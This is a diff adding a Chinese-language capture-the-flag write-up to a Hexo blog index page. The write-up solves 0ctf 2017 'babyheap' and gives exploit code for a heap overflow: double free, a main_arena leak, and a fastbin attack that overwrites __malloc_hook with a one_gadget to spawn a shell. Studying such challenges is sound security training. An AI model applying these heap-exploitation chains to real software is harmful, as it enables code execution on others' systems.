@@ -115,7 +115,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -145,6 +145,82 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/04/0ctf-2017-babyheap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/08/04/0ctf-2017-babyheap/" class="post-title-link" itemprop="url">0ctf_2017_babyheap</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-08-04 02:15:45 / Modified: 02:38:16" itemprop="dateCreated datePublished" datetime="2022-08-04T02:15:45+08:00">2022-08-04</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>一道比较简单的堆题，但是因为一些比较nt的原因，导致做了很久才出shell</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先编辑堆块的地方有一个很明显的堆溢出（输入字符串任意大小）</p>
+<p><img src="https://s2.loli.net/2022/08/04/m9bdQfiTtKRPXnA.png" alt="图片.png"></p>
+<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>1.通过堆溢出，来构成一个double free</p>
+<p>2.通过double free来泄露unsorted bin指向的main_arena</p>
+<p>3.利用fast bin attack来修改malloc_hook为one_gadget(寻找‘\x7f’作为fake_chunk的size位)</p>
+<h2 id="利用堆溢出，构造double-free"><a href="#利用堆溢出，构造double-free" class="headerlink" title="利用堆溢出，构造double free"></a>利用堆溢出，构造double free</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">add(0x10)#0</span><br><span class="line">add(0x10)#1</span><br><span class="line">add(0x10)#2</span><br><span class="line">add(0x10)#3</span><br><span class="line">add(0x80)#4</span><br><span class="line">add(0x10)#5防止unsorted bin和topchunk合并</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+b&#x27;\x80&#x27;#修改fd指针指向chunk4</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line">payload1=p64(0)*3+b&#x27;\x21&#x27;</span><br><span class="line">fill(3,len(payload1),payload1)</span><br><span class="line">add(0x10)#1</span><br><span class="line">add(0x10)#2and4同时指向chunk4</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用double-free泄露main-arena"><a href="#利用double-free泄露main-arena" class="headerlink" title="利用double free泄露main_arena"></a>利用double free泄露main_arena</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload2=p64(0)*3+b&#x27;\x91&#x27;</span><br><span class="line">fill(3,len(payload2),payload2)#将chunk4的size修改回来</span><br><span class="line">delete(4)</span><br><span class="line">show(2)</span><br><span class="line">malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))-88-0x10</span><br><span class="line">print(&quot;malloc_hook:&quot;+hex(malloc_hook))</span><br><span class="line">base=malloc_hook-libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">onegadget=base+0x4526a</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用fast-bin-attack修改malloc-hook"><a href="#利用fast-bin-attack修改malloc-hook" class="headerlink" title="利用fast bin attack修改malloc_hook"></a>利用fast bin attack修改malloc_hook</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(0x60)#4切割unsorted bin</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">payload3=p64(malloc_hook-0x8-0x2-0x8-1-0x10)#在malloc_hook的低地址处寻找‘/x7f’</span><br><span class="line">fill(2,len(payload3),payload3)#利用double free的指针2修改fast bin的fd指针指向malloc_hook附近构造fake chunk</span><br><span class="line">add(0x60)#4</span><br><span class="line">add(0x60)#6</span><br><span class="line">payload4=b&#x27;A&#x27;*(0x8+0x2+0x8+1)+p64(onegadget)</span><br><span class="line">fill(6,len(payload4),payload4)</span><br><span class="line">add(0x10)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
